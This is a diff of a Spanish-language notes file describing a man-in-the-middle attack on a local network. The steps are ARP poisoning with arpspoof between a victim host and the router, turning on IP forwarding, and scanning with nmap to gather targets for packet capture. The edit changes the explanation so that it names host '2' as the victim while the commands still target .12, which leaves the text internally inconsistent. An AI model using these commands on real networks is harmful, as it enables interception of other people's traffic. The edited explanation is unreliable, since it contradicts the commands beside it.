@@ -5,7 +5,7 @@ TRACTATUS ELEMENTALIS
 Capturar paquetes de equipos de una red. Previamente preparar el equipo con los pasos previos para el envenenamiento arp lanzando en dos terminales y sin cerrarlas hasta terminar la captura:
 # arpspoof -i eth0 -t 192.168.1.12 192.168.1.1
 # arpspoof -i eth0 -t 192.168.1.1 192.168.1.12
-El “12” el sniffado, el "1" el router y el -i … la red. El paquete que contiene arpspoof es dsniff. Activar forwarding para que los paquetes vayan a su verdadero dueño:
+El "2" el sniffado, el "1" el router y el -i … la red. El paquete que contiene arpspoof es dsniff. Activar forwarding para que los paquetes vayan a su verdadero dueño:
 # echo 1 > /proc/sys/net/ipv4/ip_forward
 Para conocer los parámetros [ips y MACs] que luego tendremos que entrar en 4g8 lanzar:
 # nmap 192.168.1.0/24
